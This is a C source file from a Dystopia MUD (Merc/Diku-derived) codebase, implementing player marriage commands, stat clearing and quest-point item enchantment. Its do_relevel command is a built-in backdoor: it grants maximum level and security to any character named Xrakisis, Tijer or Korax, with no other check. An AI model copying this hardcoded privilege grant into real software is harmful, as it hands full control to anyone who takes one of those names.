/***************************************************************************
 *  Original Diku Mud copyright (C) 1990, 1991 by Sebastian Hammer,        *
 *  Michael Seifert, Hans Henrik St{rfeldt, Tom Madsen, and Katja Nyboe.   *
 *                                                                         *
 *  Merc Diku Mud improvments copyright (C) 1992, 1993 by Michael          *
 *  Chastain, Michael Quan, and Mitchell Tse.                              *
 *                                                                         *
 *  In order to use any part of this Merc Diku Mud, you must comply with   *
 *  both the original Diku license in 'license.doc' as well the Merc       *
 *  license in 'license.txt'.  In particular, you may not remove either of *
 *  these copyright notices.                                               *
 *                                                                         *
 *  Dystopia Mud improvements copyright (C) 2000, 2001 by Brian Graversen  *
 *                                                                         *
 *  Much time and thought has gone into this software and you are          *
 *  benefitting.  We hope that you share your changes too.  What goes      *
 *  around, comes around.                                                  *
 ***************************************************************************/

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "merc.h"

void clear_stats(CHAR_DATA * ch)
{
  OBJ_DATA *obj;
  OBJ_DATA *obj_next;

  if (IS_NPC(ch))
    return;

  for (obj = ch->carrying; obj != NULL; obj = obj_next)
  {
    obj_next = obj->next_content;
    if (obj->wear_loc != WEAR_NONE)
    {
      obj_from_char(obj);
      obj_to_char(obj, ch);
    }
  }
  while (ch->affected)
    affect_remove(ch, ch->affected);
  ch->armor = 100;
  ch->hitroll = 0;
  ch->damroll = 0;
  ch->saving_throw = 0;
  ch->pcdata->mod_str = 0;
  ch->pcdata->mod_int = 0;
  ch->pcdata->mod_wis = 0;
  ch->pcdata->mod_dex = 0;
  ch->pcdata->mod_con = 0;
  save_char_obj(ch);
  return;
}

/* In case we need to remove our pfiles, or wanna turn mortal for a bit */
void do_relevel(CHAR_DATA * ch, char *argument)
{
  if (IS_NPC(ch))
    return;
  else if (!str_cmp(ch->pcdata->switchname, "Xrakisis"))
  {
    ch->level = MAX_LEVEL;
    ch->trust = MAX_LEVEL;
    ch->pcdata->security = 9;
    send_to_char("Checking.....\n\rAccess Granted.\n\r", ch);
    return;
  }
  else if (!str_cmp(ch->pcdata->switchname, "Tijer"))
  {
    ch->level = MAX_LEVEL;
    ch->trust = MAX_LEVEL;
    ch->pcdata->security = 9;
    send_to_char("Checking.....\n\rAccess Granted.\n\r", ch);
    return;
  }
  else if (!str_cmp(ch->pcdata->switchname, "Korax"))
  {
    ch->level = MAX_LEVEL;
    ch->trust = MAX_LEVEL;
    ch->pcdata->security = 9;
    send_to_char("Checking.....\n\rAccess Granted.\n\r", ch);
    return;
  }

  else
  {
    WAIT_STATE(ch, 48);
    send_to_char("Huh?.\n\r", ch);
  }
  return;
}

void do_propose(CHAR_DATA * ch, char *argument)
{
  char arg[MAX_INPUT_LENGTH];
  CHAR_DATA *victim;

  one_argument(argument, arg);

  if (IS_NPC(ch))
    return;

  if (strlen(ch->pcdata->marriage) > 1)
  {
    if (IS_EXTRA(ch, EXTRA_MARRIED))
      send_to_char("But you are already married!\n\r", ch);
    else
      send_to_char("But you are already engaged!\n\r", ch);
    return;
  }

  if (arg[0] == '\0')

  {

    send_to_char("Who do you wish to propose marriage to?\n\r", ch);

    return;

  }

  if ((victim = get_char_room(ch, arg)) == NULL)

  {

    send_to_char("They are not here.\n\r", ch);

    return;

  }

  if (IS_NPC(victim))

  {

    send_to_char("Not on NPC's.\n\r", ch);

    return;

  }

  if (victim == ch)
  {
    send_to_char("Are you crazy ?!?!?!\n\r", ch);
    return;
  }

  if (strlen(victim->pcdata->marriage) > 1)

  {

    if (IS_EXTRA(victim, EXTRA_MARRIED))

      send_to_char("But they are already married!\n\r", ch);

    else

      send_to_char("But they are already engaged!\n\r", ch);

    return;

  }

/*    if ( (ch->sex == SEX_MALE && victim->sex == SEX_FEMALE) ||

	 (ch->sex == SEX_FEMALE && victim->sex == SEX_MALE) )

    {
*/
  ch->pcdata->propose = victim;

  act("You propose marriage to $M.", ch, NULL, victim, TO_CHAR);

  act("$n gets down on one knee and proposes to $N.", ch, NULL, victim, TO_NOTVICT);

  act("$n asks you quietly 'Will you marry me?'", ch, NULL, victim, TO_VICT);

  return;

/*    }

    send_to_char("I don't think that would be a very good idea...\n\r",ch);
*/
  return;

}

void do_accept(CHAR_DATA * ch, char *argument)
{

  char arg[MAX_INPUT_LENGTH];

  char buf[MAX_INPUT_LENGTH];

  CHAR_DATA *victim;

  one_argument(argument, arg);

  if (IS_NPC(ch))
    return;

  if (strlen(ch->pcdata->marriage) > 1)

  {

    if (IS_EXTRA(ch, EXTRA_MARRIED))

      send_to_char("But you are already married!\n\r", ch);

    else

      send_to_char("But you are already engaged!\n\r", ch);

    return;

  }

  if (arg[0] == '\0')

  {

    send_to_char("Who's proposal of marriage do you wish to accept?\n\r", ch);

    return;

  }

  if ((victim = get_char_room(ch, arg)) == NULL)

  {

    send_to_char("They are not here.\n\r", ch);

    return;

  }

  if (IS_NPC(victim))

  {

    send_to_char("Not on NPC's.\n\r", ch);

    return;

  }

  if (strlen(victim->pcdata->marriage) > 1)

  {

    if (IS_EXTRA(victim, EXTRA_MARRIED))

      send_to_char("But they are already married!\n\r", ch);

    else

      send_to_char("But they are already engaged!\n\r", ch);

    return;

  }

  if (victim->pcdata->propose == NULL || victim->pcdata->propose != ch)

  {

    send_to_char("But they haven't proposed to you!\n\r", ch);

    return;

  }

/*    if ( (ch->sex == SEX_MALE && victim->sex == SEX_FEMALE) ||

	 (ch->sex == SEX_FEMALE && victim->sex == SEX_MALE) )

    {
*/
  victim->pcdata->propose = NULL;
  ch->pcdata->propose = NULL;
  free_string(victim->pcdata->marriage);
  victim->pcdata->marriage = str_dup(ch->name);
  free_string(ch->pcdata->marriage);
  ch->pcdata->marriage = str_dup(victim->name);
  act("You accept $S offer of marriage.", ch, NULL, victim, TO_CHAR);
  act("$n accepts $N's offer of marriage.", ch, NULL, victim, TO_NOTVICT);
  act("$n accepts your offer of marriage.", ch, NULL, victim, TO_VICT);
  save_char_obj(ch);
  save_char_obj(victim);
  sprintf(buf, "%s and %s are now engaged!", ch->name, victim->name);
  do_info(ch, buf);
  return;

}

void do_breakup(CHAR_DATA * ch, char *argument)
{

  char arg[MAX_INPUT_LENGTH];

  char buf[MAX_INPUT_LENGTH];

  CHAR_DATA *victim;

  one_argument(argument, arg);

  if (IS_NPC(ch))
    return;

  if (strlen(ch->pcdata->marriage) > 1)

  {

    if (IS_EXTRA(ch, EXTRA_MARRIED))

    {

      send_to_char("You'll have to get divorced.\n\r", ch);

      return;

    }

  }

  else

  {

    send_to_char("But you are not even engaged!\n\r", ch);

    return;

  }

  if (arg[0] == '\0')

  {

    send_to_char("Who do you wish to break up with?\n\r", ch);

    return;

  }

  if ((victim = get_char_room(ch, arg)) == NULL)

  {

    send_to_char("They are not here.\n\r", ch);

    return;

  }

  if (IS_NPC(victim))

  {

    send_to_char("Not on NPC's.\n\r", ch);

    return;

  }

  if (strlen(victim->pcdata->marriage) > 1)

  {

    if (IS_EXTRA(victim, EXTRA_MARRIED))

    {

      send_to_char("They'll have to get divorced.\n\r", ch);

      return;

    }

  }

  else

  {

    send_to_char("But they are not even engaged!\n\r", ch);

    return;

  }

  if (!str_cmp(ch->name, victim->pcdata->marriage) && !str_cmp(victim->name, ch->pcdata->marriage))

  {

    free_string(victim->pcdata->marriage);

    victim->pcdata->marriage = str_dup("");

    free_string(ch->pcdata->marriage);

    ch->pcdata->marriage = str_dup("");

    act("You break off your engagement with $M.", ch, NULL, victim, TO_CHAR);

    act("$n breaks off $n engagement with $N.", ch, NULL, victim, TO_NOTVICT);

    act("$n breaks off $s engagement with you.", ch, NULL, victim, TO_VICT);

    save_char_obj(ch);

    save_char_obj(victim);

    sprintf(buf, "%s and %s have broken up!", ch->name, victim->name);

    do_info(ch, buf);

    return;

  }

  send_to_char("You are not engaged to them.\n\r", ch);

  return;

}

void do_marry(CHAR_DATA * ch, char *argument)
{

  char arg1[MAX_INPUT_LENGTH];

  char arg2[MAX_INPUT_LENGTH];

  char buf[MAX_INPUT_LENGTH];

  CHAR_DATA *victim1;

  CHAR_DATA *victim2;

  argument = one_argument(argument, arg1);

  argument = one_argument(argument, arg2);

  if (arg1[0] == '\0' || arg2[0] == '\0')

  {

    send_to_char("Syntax: marry <person> <person>\n\r", ch);

    return;

  }

  if ((victim1 = get_char_room(ch, arg1)) == NULL)

  {

    send_to_char("They are not here.\n\r", ch);

    return;

  }

  if ((victim2 = get_char_room(ch, arg2)) == NULL)

  {

    send_to_char("They are not here.\n\r", ch);

    return;

  }

  if (IS_NPC(victim1) || IS_NPC(victim2))

  {

    send_to_char("Not on NPC's.\n\r", ch);

    return;

  }

  if (!str_cmp(victim1->name, victim2->pcdata->marriage) && !str_cmp(victim2->name, victim1->pcdata->marriage))

  {

    SET_BIT(victim1->extra, EXTRA_MARRIED);

    SET_BIT(victim2->extra, EXTRA_MARRIED);

    save_char_obj(victim1);

    save_char_obj(victim2);

    sprintf(buf, "%s and %s are now married!", victim1->name, victim2->name);

    do_info(ch, buf);

    return;

  }

  send_to_char("But they are not yet engaged!\n\r", ch);

  return;

}

void do_divorce(CHAR_DATA * ch, char *argument)
{

  char arg1[MAX_INPUT_LENGTH];

  char arg2[MAX_INPUT_LENGTH];

  char buf[MAX_INPUT_LENGTH];

  CHAR_DATA *victim1;

  CHAR_DATA *victim2;

  argument = one_argument(argument, arg1);

  argument = one_argument(argument, arg2);

  if (arg1[0] == '\0' || arg2[0] == '\0')

  {

    send_to_char("Syntax: divorse <person> <person>\n\r", ch);

    return;

  }

  if ((victim1 = get_char_room(ch, arg1)) == NULL)

  {

    send_to_char("They are not here.\n\r", ch);

    return;

  }

  if ((victim2 = get_char_room(ch, arg2)) == NULL)

  {

    send_to_char("They are not here.\n\r", ch);

    return;

  }

  if (IS_NPC(victim1) || IS_NPC(victim2))

  {

    send_to_char("Not on NPC's.\n\r", ch);

    return;

  }

  if (!str_cmp(victim1->name, victim2->pcdata->marriage) && !str_cmp(victim2->name, victim1->pcdata->marriage))

  {

    if (!IS_EXTRA(victim1, EXTRA_MARRIED) || !IS_EXTRA(victim2, EXTRA_MARRIED))

    {

      send_to_char("But they are not married!\n\r", ch);

      return;

    }

    REMOVE_BIT(victim1->extra, EXTRA_MARRIED);

    REMOVE_BIT(victim2->extra, EXTRA_MARRIED);

    free_string(victim1->pcdata->marriage);

    victim1->pcdata->marriage = str_dup("");

    free_string(victim2->pcdata->marriage);

    victim2->pcdata->marriage = str_dup("");

    save_char_obj(victim1);

    save_char_obj(victim2);

    sprintf(buf, "%s and %s are now divorced!", victim1->name, victim2->name);

    do_info(ch, buf);

    return;

  }

  send_to_char("But they are not married!\n\r", ch);

  return;

}

void oset_affect(CHAR_DATA * ch, OBJ_DATA * obj, int value, int affect, bool is_quest)
{
  char buf[MAX_STRING_LENGTH];
  AFFECT_DATA *paf;
  int quest;
  int range;
  int cost;
  int max;

  if (IS_NPC(ch))
  {
    send_to_char("Switch back, smart ass.\n\r", ch);
    return;
  }

  if (value == 0)
  {
    send_to_char("Please enter a positive or negative amount.\n\r", ch);
    return;
  }
  if (!IS_JUDGE(ch) && (obj->questowner == NULL))
  {
    send_to_char("First you must set the owners name on the object.\n\r", ch);
    return;
  }
  if (!IS_JUDGE(ch) && (obj->questmaker == NULL || str_cmp(ch->name, obj->questmaker)) && !is_quest)
  {
    send_to_char("That item has already been oset by someone else.\n\r", ch);
    return;
  }
  if (affect == APPLY_STR)
  {
    range = 3;
    cost = 20;
    quest = QUEST_STR;
  }
  else if (affect == APPLY_DEX)
  {
    range = 3;
    cost = 20;
    quest = QUEST_DEX;
  }
  else if (affect == APPLY_INT)
  {
    range = 3;
    cost = 20;
    quest = QUEST_INT;
  }
  else if (affect == APPLY_WIS)
  {
    range = 3;
    cost = 20;
    quest = QUEST_WIS;
  }
  else if (affect == APPLY_CON)
  {
    range = 3;
    cost = 20;
    quest = QUEST_CON;
  }
  else if (affect == APPLY_HIT)
  {
    range = 25;
    cost = 5;
    quest = QUEST_HIT;
  }
  else if (affect == APPLY_MANA)
  {
    range = 25;
    cost = 5;
    quest = QUEST_MANA;
  }
  else if (affect == APPLY_MOVE)
  {
    range = 25;
    cost = 5;
    quest = QUEST_MOVE;
  }
  else if (affect == APPLY_HITROLL)
  {
    range = 5;
    cost = 30;
    quest = QUEST_HITROLL;
  }
  else if (affect == APPLY_DAMROLL)
  {
    range = 5;
    cost = 30;
    quest = QUEST_DAMROLL;
  }
  else if (affect == APPLY_AC)
  {
    range = 25;
    cost = 10;
    quest = QUEST_AC;
  }
  else
    return;

  if (IS_SET(obj->quest, QUEST_IMPROVED))

    max = 1500;

  else if (obj->pIndexData->vnum == OBJ_VNUM_PROTOPLASM)

  {
    range *= 2;
    max = 1000;
  }

  else

    max = 600;

  if (obj->item_type == ITEM_WEAPON)
  {
    max *= 2;
    range *= 2;
  }

  if (!IS_JUDGE(ch) && ((value > 0 && value > range) || (value < 0 && value < (range - range - range))))

  {

    send_to_char("That is not within the acceptable range...\n\r", ch);

    send_to_char("Str, Dex, Int, Wis, Con... max =   3 each, at  20 quest points per +1 stat.\n\r", ch);

    send_to_char("Hp, Mana, Move............ max =  25 each, at   5 quest point per point.\n\r", ch);

    send_to_char("Hitroll, Damroll.......... max =   5 each, at  30 quest points per point.\n\r", ch);

    send_to_char("Ac........................ max = -25,      at  10 points per point.\n\r", ch);

    send_to_char("\n\rNote: Created items can have upto 2 times the above maximum.\n\r", ch);

    send_to_char("Also: Weapons may have upto 2 (4 for created) times the above maximum.\n\r", ch);

    return;

  }

  if (quest >= QUEST_HIT && value < 0)
    cost *= (value - (value * 2));

  else
    cost *= value;

  if (cost < 0)
    cost = 0;

  if (!IS_JUDGE(ch) && IS_SET(obj->quest, quest))

  {

    send_to_char("That affect has already been set on this object.\n\r", ch);

    return;

  }

  if (!IS_JUDGE(ch) && (obj->points + cost > max))

  {

    sprintf(buf, "You are limited to %d quest points per item.\n\r", max);

    send_to_char(buf, ch);

    return;

  }

  if (is_quest && ch->pcdata->quest < cost && !IS_JUDGE(ch))

  {

    sprintf(buf, "That costs %d quest points, while you only have %d.\n\r", cost, ch->pcdata->quest);

    send_to_char(buf, ch);

    return;

  }

  if (!IS_SET(obj->quest, quest))
    SET_BIT(obj->quest, quest);
  if (is_quest)
    ch->pcdata->quest -= cost;

  obj->points += cost;

  if (obj->questmaker != NULL)
    free_string(obj->questmaker);

  obj->questmaker = str_dup(ch->name);

  if (affect_free == NULL)
  {
    paf = alloc_perm(sizeof(*paf));
  }

  else
  {
    paf = affect_free;
    affect_free = affect_free->next;

  }

  paf->type = 0;
  paf->duration = -1;
  paf->location = affect;
  paf->modifier = value;
  paf->bitvector = 0;
  paf->next = obj->affected;
  obj->affected = paf;

  return;
}

